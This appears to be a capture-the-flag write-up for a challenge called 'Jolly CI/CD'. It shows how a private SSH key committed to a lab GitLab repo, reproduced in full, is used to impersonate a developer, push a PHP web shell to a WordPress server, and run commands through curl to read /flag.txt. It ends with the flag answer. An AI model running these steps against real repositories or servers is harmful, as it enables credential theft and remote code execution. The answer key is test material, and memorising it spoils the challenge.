# Jolly CI/CD

<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 width=850 >
 <tr align= Center>
  <td width=808 colspan=2 valign=top style='width:605.85pt;border:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MyNormalStyle><img border=0 width=19 height=20 id="Picture 360"
  src="../../images/blog_images/image094.png">Jolly
  CI/CD &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img border=0
  width=27 height=25 id="Picture 44"
  src="../../images/blog_images/image039.png">Elfen
  Ring &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img
  border=0 width=25 height=24 id="Picture 362"
  src="../../images/blog_images/image105.png"
  alt="A picture containing clipart&#10;&#10;Description automatically generated">Rippin
  Proudboot</p>
  </td>
 </tr>
 <tr style='height:100.6pt'>
  <td width=290 rowspan=2 valign=top style='width:217.8pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:100.6pt'>
  <p class=MyNormalStyle><img border=0 width=275 height=174 id="Picture 366"
  src="../../images/blog_images/image106.png"
  alt="A picture containing text&#10;&#10;Description automatically generated"></p>
  </td>
  <td width=517 valign=top style='width:388.05pt;border-top:none;border-left:
  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt;height:100.6pt'>
  <p class=MyNormalStyle><img border=0 width=459 height=152 id="Picture 365"
  src="../../images/blog_images/image107.png"
  alt="A screenshot of a computer&#10;&#10;Description automatically generated with medium confidence"></p>
  </td>
 </tr>
 <tr style='height:39.85pt'>
  <td width=517 valign=top style='width:388.05pt;border-top:none;border-left:
  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt;height:39.85pt'>
  <p class=MyNormalStyle><u>Hints<br>
  </u>1) The thing about Git is that every step of development is accessible 
  even steps you didn't mean to take! git log can show code skeletons.</p>
  <p class=MyNormalStyle>2) Gitlab repo <a
  href="http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git">http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</a></p>
  <p class=MyNormalStyle>3) If you find a way to impersonate another identity,
  you might try re-cloning a repo with their credentials.</p>
  </td>
 </tr>
</table>


<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 width=798
 style='width:598.5pt; margin-xxxleft:-63.25pt;border-collapse:collapse;border:
 none'>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Clone the git repo and get into the directory where it
  was cloned into</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
  cd wordpress.flag.net.internal
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <img src="../../images/blog_images/image108.png">
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Get git logs. Shows a commit with potential mistake
  with whoops comment</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  git log --oneline
  ```
  </p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <img src="../../images/blog_images/image109.png">
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Show the log with commits. Looks like
  sporx@kringlecon.com committed with &quot;whoops&quot; comment.</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  git log
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'><img
  border=0 width=624 height=94 id="Picture 371"
  src="../../images/blog_images/image110.png"
  alt="A picture containing graphical user interface&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Show what was committed under that id e19f653bde9ea3de6af21a587e41e7a909db1ca5<br>
  Looks like user has committed their the private and public key. So we will
  use these to clone the repo and commit changes impersonating the user</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  git show e19f653bde9ea3de6af21a587e41e7a909db1ca5
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <img id="Picture 372" src="../../images/blog_images/image111.png"></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Create .ssh folder and create the private key (.deploy)
  and public key(.deploy.pub) from the contents above</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  mkdir /home/samways/.ssh
  cd /home/samways/.ssh
  nano .deploy
  ```
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>-----BEGIN
  OPENSSH PRIVATE KEY-----</span></p>
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span></p>
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5</span></p>
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g</span></p>
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot</span></p>
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==</span></p>
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>-----END
  OPENSSH PRIVATE KEY-----</span></p>
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>&nbsp;</span></p>
  ```python
  nano .deploy.pub
  ```
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>ssh-ed25519
  AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri
  sporx@kringlecon.com</span></p>
  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'>&nbsp;</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Set the full read and write permission only for the
  owner</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  chmod 600 .deploy
  chmod 600 .deploy.pub 
  ls -lah
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p style='margin:0in'><img border=0 width=486 height=96 id="Picture 373"
  src="../../images/blog_images/image112.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Set the git config email and name</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
   ```python
   git config --global user.email "sporx@kringlecon.com"
   git config --global user.name "knee-oh"
   ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p style='margin:0in'><img border=0 width=624 height=56 id="Picture 374"
  src="../../images/blog_images/image113.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Start the SSH agent</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
    ```python
    eval "$(ssh-agent -s)"
    ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
  border=0 width=385 height=31 id="Picture 376"
  src="../../images/blog_images/image114.png"></span></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Add the SSH private key to the SSH agent</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  ssh-add .deploy
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
  border=0 width=399 height=31 id="Picture 378"
  src="../../images/blog_images/image115.png"></span></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Clone the git repo again with SSH using the private key
  of the user sporx@kringlecon.com to a directory named
  &quot;wordpress.flag.net.internal2&quot;</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
  wordpress.flag.net.internal2
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
 <img src="../../images/blog_images/image116.png"></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>The repo is now cloned to the &quot;wordpress.flag.net.internal2&quot;
  directory</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  ls wordpress.flag.net.internal2
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <img border=0 src="../../images/blog_images/image117.png">
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Create a new backdoor to execute commands on the remote
  host (wordpress web server, wordpress.flag.net.internal). This will take a
  querystring cat=&lt;URL encoded command&gt;</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  nano shell.php
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
  border=0 width=510 height=45 id="Picture 382"
  src="../../images/blog_images/image118.png"></span></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Add the newly saved shell.php and commit to the repo</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python 
  git add .
  git commit
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <img border=0 src="../../images/blog_images/image119.png">
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Push the changes to the remote repository</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  git push
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p style='margin:0in'><img border=0 src="../../images/blog_images/image120.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Now we can execute arbitrary commands using shell.php.
  Below showing using ls command which also lists newly uploaded shell.php</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  curl http://wordpress.flag.net.internal/shell.php?cmd=ls
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <img border=0   src="../../images/blog_images/image121.png"></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Getting contents of root (/) showing flag.txt</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  curl http://wordpress.flag.net.internal/shell.php?cmd=ls%20%2F%2F
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p style='margin:0in'><img border=0 src="../../images/blog_images/image122.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Getting the contents of that /flag.txt</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  curl http://wordpress.flag.net.internal/shell.php?cmd=cat%20%2Fflag.txt
  ```
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p style='margin:0in'><img border=0 src="../../images/blog_images/image123.png"
  alt="Chart&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Answer : oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>The objective is now completed and we get 100 coins as
  well</p>
  <p class=TableRowBold><img border=0 width=287 height=55 id="Picture 388"
  src="../../images/blog_images/image124.png"
  alt="Text&#10;&#10;Description automatically generated with medium confidence"><img
  border=0 width=266 height=57 id="Picture 22"
  src="../../images/blog_images/image125.png"></p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>At this point we have recovered the Elfen ring</p>
  </td>
 </tr>
 <tr>
  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold align=center style='text-align:center'><img border=0
  width=547 height=99 id="Picture 476"
  src="../../images/blog_images/image126.png"></p>
  </td>
 </tr>
</table>